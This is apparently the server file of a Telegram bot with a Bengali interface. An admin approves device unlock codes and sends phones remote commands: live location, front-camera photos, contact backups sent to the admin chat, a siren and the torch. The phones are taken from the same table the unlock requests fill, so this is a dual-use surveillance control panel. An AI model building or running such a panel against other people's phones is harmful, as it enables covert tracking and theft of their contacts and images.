// File: server.js & bot.js (ES Module Version for Render)

import http from 'http';
import { Telegraf, Markup } from 'telegraf';
import { createClient } from '@supabase/supabase-js';

// ক্রেডেনশিয়াল কনফিগারেশন
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;

const requiredEnv = ['BOT_TOKEN', 'ADMIN_CHAT_ID', 'SUPABASE_URL', 'SUPABASE_SERVICE_KEY'];
const missingEnv = requiredEnv.filter(name => !process.env[name]);

if (missingEnv.length > 0) {
    console.error(`ত্রুটি: প্রয়োজনীয় এনভায়রনমেন্ট ভ্যারিয়েবল অনুপস্থিত: ${missingEnv.join(', ')}`);
    console.error('অনুগ্রহ করে .env ফাইল বা হোস্টিং এনভায়রনমেন্টে এই মানগুলো সেট করুন।');
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// অ্যাডমিন প্রধান মেন্যু / মোড সুইচ ড্যাশবোর্ড
function getAdminMainMenu() {
    const text = `<b>অ্যাডমিন কন্ট্রোল প্যানেল</b>\n\n` +
        `নিচের বাটনগুলো ব্যবহার করে মোড নির্বাচন করুন:\n\n` +
        `<b>১. আনলক কোড মোড:</b> ব্যবহারকারীদের সাময়িক আনলক অনুরোধ ও কোড অনুমোদন।\n` +
        `<b>২. ফোন রিকভারি মোড:</b> হারানো বা চুরি হওয়া ফোন রিমোট কন্ট্রোল, ট্র্যাকিং ও অ্যালার্ম।`;

    const keyboard = Markup.inlineKeyboard([
        [
            Markup.button.callback('মোড ১: আনলক কোড', 'admin_mode_unlock'),
            Markup.button.callback('মোড ২: ফোন রিকভারি', 'admin_mode_recovery')
        ],
        [
            Markup.button.callback('সিস্টেম স্ট্যাটাস', 'admin_status')
        ]
    ]);

    return { text, keyboard };
}

// ১. /start হ্যান্ডলার
bot.start(async (ctx) => {
    try {
        const textParts = (ctx.message.text || '').split(' ');
        const payload = textParts[1]; // deviceId
        const userId = ctx.from.id;
        const userFullName = escapeHtml(`${ctx.from.first_name || ''} ${ctx.from.last_name || ''}`.trim());
        const username = ctx.from.username ? `@${escapeHtml(ctx.from.username)}` : 'N/A';

        // যদি কোনো পে-লোড না থাকে বা চ্যাট আইডি / সিকিউরিটি নেওয়ার জন্য আসে
        const lowerPayload = (payload || '').toLowerCase();
        if (!payload || lowerPayload === 'security' || lowerPayload === 'chatid') {
            // অ্যাডমিন হলে সরাসরি সুইচ মোড কন্ট্রোল প্যানেল দেখানো
            if (String(userId) === String(ADMIN_CHAT_ID)) {
                const menu = getAdminMainMenu();
                return ctx.reply(menu.text, { parse_mode: 'HTML', ...menu.keyboard });
            }
            return ctx.reply(
                `<b>আপনার টেলিগ্রাম চ্যাট আইডি:</b>\n` +
                `<code>${userId}</code>\n\n` +
                `<i>(আইডিটি কপি করতে উপরের নম্বরে চাপ দিন। এরপর অ্যাপে ফিরে গিয়ে বক্সে পেস্ট করে 'অনুমতি দিন ও চালু করুন' বাটনে চাপ দিন।)</i>`,
                { parse_mode: 'HTML' }
            );
        }

        const deviceId = payload.trim().toLowerCase();

        // ইউজারকে দেওয়া নোটিশ
        const userWaitMsg = `<b>আপনার মেসেজটি পৌঁছেছে!</b>\n\n` +
            `আপনার আনলক অনুরোধটি গ্রহণ করা হয়েছে। অনুগ্রহ করে অ্যাডমিনের অ্যাপ্রুভালের জন্য অপেক্ষা করুন। অনুমোদন পাওয়া মাত্র ইউনিক কোডটি এই চ্যাটে চলে আসবে।`;
        await ctx.reply(userWaitMsg, { parse_mode: 'HTML' });

        // অ্যাডমিনকে পাঠানোর ফরম্যাট
        const adminMsg = `<b>নতুন আনলক অনুরোধ</b>\n\n` +
            `<b>Device ID:</b> <code>${deviceId}</code>\n` +
            `<b>User:</b> ${userFullName} (${username})\n` +
            `<b>User ID:</b> <code>${userId}</code>\n` +
            `<b>Reason:</b> সাময়িক আনলক প্রয়োজন\n` +
            `<b>Status:</b> অপেক্ষারত (Pending Approval)\n\n` +
            `অনুমোদনের জন্য সময় নির্বাচন করুন:`;

        const inlineKeyboard = Markup.inlineKeyboard([
            [
                Markup.button.callback('৫ মিনিট', `unlock_5_${deviceId}_${userId}`),
                Markup.button.callback('১০ মিনিট', `unlock_10_${deviceId}_${userId}`)
            ],
            [
                Markup.button.callback('পার্মানেন্ট', `unlock_perm_${deviceId}_${userId}`),
                Markup.button.callback('বাতিল', `reject_${deviceId}_${userId}`)
            ]
        ]);

        await bot.telegram.sendMessage(ADMIN_CHAT_ID, adminMsg, {
            parse_mode: 'HTML',
            ...inlineKeyboard
        });

    } catch (err) {
        console.error("Start handler error:", err.message);
    }
});

// মেন্যু কমান্ড
bot.command('menu', (ctx) => {
    if (String(ctx.from.id) === String(ADMIN_CHAT_ID)) {
        const menu = getAdminMainMenu();
        return ctx.reply(menu.text, { parse_mode: 'HTML', ...menu.keyboard });
    }
});

bot.command('mode1', (ctx) => {
    if (String(ctx.from.id) === String(ADMIN_CHAT_ID)) {
        const text = `<b>মোড ১: আনলক কোড ম্যানেজমেন্ট</b>\n\n` +
            `এখানে ব্যবহারকারীদের আনলক অনুরোধ ও ওয়ান-টাইম পাসকোড পরিচালনা করা হয়।\n` +
            `যেকোনো নতুন আনলক অনুরোধ স্বয়ংক্রিয়ভাবে এই চ্যাটে চলে আসবে।`;
        const keyboard = Markup.inlineKeyboard([
            [
                Markup.button.callback('সক্রিয় কোড সমূহ', 'admin_view_active_codes'),
                Markup.button.callback('ব্যবহৃত কোড হিস্টোরি', 'admin_view_used_codes')
            ],
            [
                Markup.button.callback('প্রধান মেন্যু / মোড সুইচ', 'admin_back_main')
            ]
        ]);
        return ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
    }
});

bot.command('mode2', (ctx) => {
    if (String(ctx.from.id) === String(ADMIN_CHAT_ID)) {
        const text = `<b>মোড ২: ফোন রিকভারি ও সিকিউরিটি</b>\n\n` +
            `ফোনে ভুল পিন দিলে ফ্রন্ট ক্যামেরা দিয়ে তোলা ছবি এবং গুগল ম্যাপ লোকেশন সরাসরি নোটিফিকেশন হিসেবে আসবে।\n\n` +
            `নিচের অপশনগুলো দিয়ে ডিভাইস তথ্য ও রিমোট অ্যাকশন নিয়ন্ত্রণ করুন:`;
        const keyboard = Markup.inlineKeyboard([
            [
                Markup.button.callback('রেজিস্টার্ড ডিভাইস তালিকা', 'admin_view_devices'),
                Markup.button.callback('ডিভাইস সিকিউরিটি গাইড', 'admin_view_device_status')
            ],
            [
                Markup.button.callback('প্রধান মেন্যু / মোড সুইচ', 'admin_back_main')
            ]
        ]);
        return ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
    }
});

// সুইচ মোড বাটন অ্যাকশন
bot.action('admin_mode_unlock', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const text = `<b>মোড ১: আনলক কোড ম্যানেজমেন্ট</b>\n\n` +
        `এখানে ব্যবহারকারীদের আনলক অনুরোধ ও ওয়ান-টাইম পাসকোড পরিচালনা করা হয়।\n` +
        `যেকোনো নতুন আনলক অনুরোধ স্বয়ংক্রিয়ভাবে এই চ্যাটে চলে আসবে।`;
    const keyboard = Markup.inlineKeyboard([
        [
            Markup.button.callback('সক্রিয় কোড সমূহ', 'admin_view_active_codes'),
            Markup.button.callback('ব্যবহৃত কোড হিস্টোরি', 'admin_view_used_codes')
        ],
        [
            Markup.button.callback('প্রধান মেন্যু / মোড সুইচ', 'admin_back_main')
        ]
    ]);
    try {
        await ctx.editMessageText(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

bot.action('admin_mode_recovery', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const text = `<b>মোড ২: ফোন রিকভারি ও সিকিউরিটি</b>\n\n` +
        `ফোনে ভুল পিন দিলে ফ্রন্ট ক্যামেরা দিয়ে তোলা ছবি এবং গুগল ম্যাপ লোকেশন সরাসরি নোটিফিকেশন হিসেবে আসবে।\n\n` +
        `নিচের অপশনগুলো দিয়ে ডিভাইস তথ্য ও রিমোট অ্যাকশন নিয়ন্ত্রণ করুন:`;
    const keyboard = Markup.inlineKeyboard([
        [
            Markup.button.callback('রেজিস্টার্ড ডিভাইস তালিকা', 'admin_view_devices'),
            Markup.button.callback('ডিভাইস সিকিউরিটি গাইড', 'admin_view_device_status')
        ],
        [
            Markup.button.callback('প্রধান মেন্যু / মোড সুইচ', 'admin_back_main')
        ]
    ]);
    try {
        await ctx.editMessageText(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

bot.action('admin_back_main', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const menu = getAdminMainMenu();
    try {
        await ctx.editMessageText(menu.text, { parse_mode: 'HTML', ...menu.keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

bot.action('admin_status', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const text = `<b>সিস্টেম স্ট্যাটাস</b>\n\n` +
        `সার্ভার: অনলাইন (Render)\n` +
        `ডাটাবেজ: সংযুক্ত (Supabase)\n` +
        `টেলিগ্রাম বট: সক্রিয়\n` +
        `অনুপ্রবেশকারী সতর্কতা: সক্রিয়\n` +
        `রিমোট রিকভারি কমান্ড: সক্রিয়\n` +
        `সুইচ মোড: সক্রিয়`;
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('প্রধান মেন্যুতে ফিরুন', 'admin_back_main')]
    ]);
    try {
        await ctx.editMessageText(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

bot.action('admin_view_active_codes', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    try {
        const { data, error } = await supabase
            .from('unlock_codes')
            .select('device_id, code, duration_minutes, created_at')
            .eq('is_used', false)
            .order('created_at', { ascending: false })
            .limit(5);

        let msg = `<b>সক্রিয় (Unused) আনলক কোড সমূহ:</b>\n\n`;
        if (error || !data || data.length === 0) {
            msg += `বর্তমানে কোনো সক্রিয় বা অব্যবহৃত কোড নেই।`;
        } else {
            data.forEach((c, idx) => {
                msg += `${idx + 1}. ডিভাইস: <code>${escapeHtml(c.device_id)}</code>\n   কোড: <code>${c.code}</code> (${c.duration_minutes} মিনিট)\n\n`;
            });
        }
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('পেছনে ফিরুন', 'admin_mode_unlock')]
        ]);
        await ctx.editMessageText(msg, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {
        console.error("Error fetching active codes:", e);
    }
    ctx.answerCbQuery();
});

bot.action('admin_view_used_codes', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    try {
        const { data, error } = await supabase
            .from('unlock_codes')
            .select('device_id, code, duration_minutes, created_at')
            .eq('is_used', true)
            .order('created_at', { ascending: false })
            .limit(5);

        let msg = `<b>ব্যবহৃত (Used) কোড হিস্টোরি:</b>\n\n`;
        if (error || !data || data.length === 0) {
            msg += `কোনো ব্যবহৃত কোড রেকর্ড পাওয়া যায়নি।`;
        } else {
            data.forEach((c, idx) => {
                msg += `${idx + 1}. ডিভাইস: <code>${escapeHtml(c.device_id)}</code>\n   কোড: <code>${c.code}</code> (ব্যবহৃত)\n\n`;
            });
        }
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('পেছনে ফিরুন', 'admin_mode_unlock')]
        ]);
        await ctx.editMessageText(msg, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {
        console.error("Error fetching used codes:", e);
    }
    ctx.answerCbQuery();
});

// ডিভাইস তালিকা ও রিমোট ম্যানেজমেন্ট নির্বাচন
bot.action('admin_view_devices', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    try {
        const { data, error } = await supabase
            .from('unlock_codes')
            .select('device_id, created_at')
            .order('created_at', { ascending: false })
            .limit(20);

        let msg = `<b>নিবন্ধিত ডিভাইস তালিকা:</b>\n\n` +
            `রিমোট কমান্ড পাঠাতে যেকোনো ডিভাইসের বাটনে চাপ দিন:\n\n`;

        const keyboardButtons = [];

        if (error || !data || data.length === 0) {
            msg += `এখনও কোনো ডিভাইস রেকর্ড পাওয়া যায়নি।`;
        } else {
            const uniqueDevices = Array.from(new Set(data.map(d => d.device_id))).filter(Boolean);
            uniqueDevices.slice(0, 8).forEach((dev, idx) => {
                msg += `${idx + 1}. ডিভাইস: <code>#HN_${escapeHtml(dev.toUpperCase())}</code>\n`;
                keyboardButtons.push([
                    Markup.button.callback(`কন্ট্রোল: #HN_${dev.toUpperCase().slice(0, 8)}`, `dev_ctrl_${dev}`)
                ]);
            });
        }

        keyboardButtons.push([
            Markup.button.callback('পেছনে ফিরুন', 'admin_mode_recovery')
        ]);

        const keyboard = Markup.inlineKeyboard(keyboardButtons);
        await ctx.editMessageText(msg, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {
        console.error("Error fetching devices:", e);
    }
    ctx.answerCbQuery();
});

// নির্দিষ্ট ডিভাইসের রিমোট কন্ট্রোল প্যানেল
bot.action(/^dev_ctrl_(.+)$/, async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const deviceId = ctx.match[1].toLowerCase();

    const text = `<b>ডিভাইস রিকভারি কন্ট্রোল প্যানেল</b>\n\n` +
        `<b>ডিভাইস আইডি:</b> <code>#HN_${deviceId.toUpperCase()}</code>\n` +
        `<b>স্ট্যাটাস:</b> সক্রিয় গার্ড সংযুক্ত\n\n` +
        `নিচের কমান্ড বাটন ব্যবহার করে ফোনে তাৎক্ষণিক সংকেত পাঠান:`;

    const keyboard = Markup.inlineKeyboard([
        [
            Markup.button.callback('সাইরেন অ্যালার্ম', `cmd_exec_${deviceId}_CMD_SIREN`),
            Markup.button.callback('সাইরেন বন্ধ', `cmd_exec_${deviceId}_CMD_SIREN_STOP`)
        ],
        [
            Markup.button.callback('লাইভ লোকেশন', `cmd_exec_${deviceId}_CMD_LOCATION`),
            Markup.button.callback('ক্যামেরা ছবি', `cmd_exec_${deviceId}_CMD_INTRUDER_PHOTO`)
        ],
        [
            Markup.button.callback('টর্চলাইট অন', `cmd_exec_${deviceId}_CMD_TORCH_ON`),
            Markup.button.callback('টর্চলাইট অফ', `cmd_exec_${deviceId}_CMD_TORCH_OFF`)
        ],
        [
            Markup.button.callback('কন্টাক্ট ব্যাকআপ (.vcf)', `cmd_exec_${deviceId}_CMD_BACKUP_CONTACTS`)
        ],
        [
            Markup.button.callback('ডিভাইস তালিকায় ফিরুন', 'admin_view_devices')
        ]
    ]);

    try {
        await ctx.editMessageText(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

// রিমোট কমান্ড এক্সিকিউশন হ্যান্ডলার
bot.action(/^cmd_exec_([^_]+)_(.+)$/, async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const deviceId = ctx.match[1].toLowerCase();
    const command = ctx.match[2];

    const commandNames = {
        'CMD_SIREN': 'সাইরেন বাজানো',
        'CMD_SIREN_STOP': 'সাইরেন বন্ধ',
        'CMD_LOCATION': 'লাইভ লোকেশন সংগ্রহ',
        'CMD_INTRUDER_PHOTO': 'ক্যামেরায় ছবি তোলা',
        'CMD_TORCH_ON': 'টর্চলাইট চালু',
        'CMD_TORCH_OFF': 'টর্চলাইট বন্ধ',
        'CMD_BACKUP_CONTACTS': 'কন্টাক্ট ব্যাকআপ'
    };

    const cmdName = commandNames[command] || command;

    try {
        // Supabase unlock_requests টেবিলে কমান্ড ইনসার্ট করা
        const { error } = await supabase.from('unlock_requests').insert({
            device_id: deviceId,
            reason: command,
            status: 'PENDING',
            device_name: 'Security Recovery'
        });

        if (error) {
            console.error("Command queue error:", error);
            return ctx.answerCbQuery("কমান্ড পাঠাতে সমস্যা হয়েছে!");
        }

        const msg = `<b>রিমোট কমান্ড পাঠানো হয়েছে</b>\n\n` +
            `<b>ডিভাইস আইডি:</b> <code>#HN_${deviceId.toUpperCase()}</code>\n` +
            `<b>কমান্ড:</b> ${cmdName}\n` +
            `<b>স্ট্যাটাস:</b> প্রসেসিং (Pending Execution)\n\n` +
            `ফোনটি পরবর্তী সিঙ্কে (কয়েক সেকেন্ডের মধ্যে) কমান্ডটি কার্যকর করে ফলাফল এই চ্যাটে পাঠাবে।`;

        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('কন্ট্রোল প্যানেলে ফিরুন', `dev_ctrl_${deviceId}`)]
        ]);

        await ctx.editMessageText(msg, { parse_mode: 'HTML', ...keyboard });
        ctx.answerCbQuery("কমান্ড সফলভাবে পাঠানো হয়েছে!");
    } catch (e) {
        console.error("Command dispatch error:", e);
        ctx.answerCbQuery("ত্রুটি ঘটেছে!");
    }
});

bot.action('admin_view_device_status', async (ctx) => {
    if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) return ctx.answerCbQuery("অননুমোদিত!");
    const text = `<b>ডিভাইস সিকিউরিটি ও স্ট্যাটাস গাইড:</b>\n\n` +
        `১. লক স্ক্রিনে কেউ ভুল পিন বা পাসওয়ার্ড দিলে স্বয়ংক্রিয়ভাবে ফ্রন্ট ক্যামেরায় ছবি উঠবে।\n` +
        `২. সাথে সাথে ফোনের ব্যাটারি পার্সেন্টেজ এবং রিয়েল-টাইম গুগল ম্যাপ লোকেশন লিংক এই চ্যাটে নোটিফিকেশন হিসেবে আসবে।\n` +
        `৩. ফোন হারিয়ে গেলে বা চুরি হলে রিমোট সাইরেন বাজানো, টর্চলাইট অন করা এবং কন্টাক্ট ব্যাকআপ নেওয়া যাবে।`;
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('পেছনে ফিরুন', 'admin_mode_recovery')]
    ]);
    try {
        await ctx.editMessageText(text, { parse_mode: 'HTML', ...keyboard });
    } catch (e) {}
    ctx.answerCbQuery();
});

// ২. ইনলাইন বাটন ক্লিকের অ্যাকশন হ্যান্ডলার (আনলক কোড তৈরি)
bot.action(/^(unlock_5|unlock_10|unlock_perm|reject)_([^_]+)_([^_]+)$/, async (ctx) => {
    try {
        const action = ctx.match[1];
        const deviceId = ctx.match[2];
        const targetUserId = ctx.match[3];

        if (String(ctx.from.id) !== String(ADMIN_CHAT_ID)) {
            return ctx.answerCbQuery("শুধুমাত্র অ্যাডমিন অনুমোদন দিতে পারবেন!");
        }

        if (action === 'reject') {
            await ctx.editMessageText(
                `<b>আনলক অনুরোধ বাতিল করা হয়েছে</b>\n\n` +
                `<b>Device ID:</b> <code>${deviceId}</code>\n` +
                `<b>Status:</b> বাতিল (Rejected by Admin)`,
                { parse_mode: 'HTML' }
            );
            try {
                await bot.telegram.sendMessage(targetUserId, "দুঃখিত, আপনার আনলক অনুরোধটি অ্যাডমিন কর্তৃক বাতিল করা হয়েছে।");
            } catch (e) {}
            return ctx.answerCbQuery("বাতিল করা হয়েছে");
        }

        let minutes = 5;
        let durationText = "৫ মিনিট";

        if (action === 'unlock_10') {
            minutes = 10;
            durationText = "১০ মিনিট";
        } else if (action === 'unlock_perm') {
            minutes = 52560000;
            durationText = "পার্মানেন্ট (স্থায়ী)";
        }

        // ইউনিক ৬ ডিজিটের ওয়ান-টাইম পাসকোড জেনারেটর
        const randomCode = Math.floor(100000 + Math.random() * 900000).toString();

        // Supabase-এ সেভ করা
        const { error } = await supabase.from('unlock_codes').insert({
            device_id: deviceId,
            code: randomCode,
            duration_minutes: minutes,
            is_used: false
        });

        if (error) {
            console.error("Supabase Save Error:", error);
            return ctx.answerCbQuery("ডাটাবেসে সেভ হতে সমস্যা হয়েছে!");
        }

        // অ্যাডমিন স্ক্রিন কনফার্মেশন
        const adminDeliveredMsg = `<b>ইউনিক আনলক কোড তৈরি সম্পন্ন</b>\n\n` +
            `<b>Device ID:</b> <code>${deviceId}</code>\n` +
            `<b>Code:</b> <code>${randomCode}</code>\n` +
            `<b>Duration:</b> ${durationText}\n` +
            `<b>Status:</b> পাঠানো হয়েছে (Unused)\n\n` +
            `কোডটি সফলভাবে ইউজারের কাছে পাঠানো হয়েছে।`;

        await ctx.editMessageText(adminDeliveredMsg, { parse_mode: 'HTML' });

        // ইউজারের কাছে ডেলিভারি
        const userCodeDeliveryMsg = `<b>Unlock Code</b>\n\n` +
            `আপনার Unlock Code:\n\n` +
            `<code>${randomCode}</code>\n\n` +
            `এই কোডটি <b>${durationText}ের জন্য</b> ব্যবহারযোগ্য।\n` +
            `কোডটি শুধুমাত্র একবার ব্যবহার করা যাবে।\n` +
            `এই কোডটি শুধুমাত্র আপনার নির্দিষ্ট ডিভাইসের জন্য কাজ করবে।\n\n` +
            `অ্যাপে ফিরে গিয়ে কোডটি ব্যবহার করুন।`;

        await bot.telegram.sendMessage(targetUserId, userCodeDeliveryMsg, { parse_mode: 'HTML' });
        await ctx.answerCbQuery("কোড তৈরি ও পাঠানো সম্পন্ন!");

    } catch (actionErr) {
        console.error("Action error:", actionErr);
    }
});

// ৩. Render-এর জন্য ওয়েব পোর্ট
const PORT = process.env.PORT || 10000;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    res.end('Helpniche Telegram Bot is Active & Running 24/7 on Render!');
});

server.listen(PORT, () => {
    console.log(`Web listener active on port: ${PORT}`);
});

bot.launch().then(() => {
    console.log("Telegram Bot is running smoothly with Switch Mode...");
});

process.once('SIGINT', () => { bot.stop('SIGINT'); server.close(); });
process.once('SIGTERM', () => { bot.stop('SIGTERM'); server.close(); });